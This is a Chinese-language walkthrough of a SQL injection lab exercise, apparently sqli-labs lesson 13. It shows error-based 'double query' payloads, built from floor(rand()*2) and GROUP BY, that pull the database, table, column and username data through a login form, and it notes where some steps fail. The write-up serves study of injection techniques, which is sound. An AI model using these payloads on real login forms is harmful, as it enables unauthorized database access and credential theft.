题目:POST-Double injection-Single quotes-String with twist

看题目已经知道是带括号的单引号的查询语句

猜语句

username:’

所以查询语句为:

$sql=”SELECT username, password FROM users WHERE username=(‘$uname’) and password=(‘$passwd’) LIMIT 0,1”;

然而如果像les12一样输入

username:’) union select 1,2#
会变成这样👇

但是这样并没有像les12一样显示出username:1 password:2

所以要从另一个角度看,题目说着是double injection,那就来double injection的操作吧

复习一下double injection需要用到的函数:

rand() 生成一个0-1的随机数
floor()取整
count()统计查询对象的总数
group by x 按x对查询结果进行分组

具体原理可以看一下付杰博客的SQL双查询注入详解

库名

‘) union select count(*),concat(‘*‘,database(),’*‘,floor(rand(14)*2))as a from information_schema.tables group by a #

表名

‘) union select count(*),concat(‘*‘,(select group_concat(table_name) from information_schema.columns where table_schema=database()),’*‘,floor(rand(14)*2))as a from information_schema.tables group by a #
有问题:会重复2次

列

‘) union select count(*),concat(‘*‘,(select group_concat(column_name) from information_schema.columns where table_name=’users’),’*‘,floor(rand(14)*2))as a from information_schema.tables group by a #

值

‘) union select count(*),concat(‘*‘,(select group_concat(username) from users),’*‘,floor(rand(6)*2))as a from information_schema.columns group by a #
有问题,这个会变成logged in successfully,而没有报错因此得不到数据
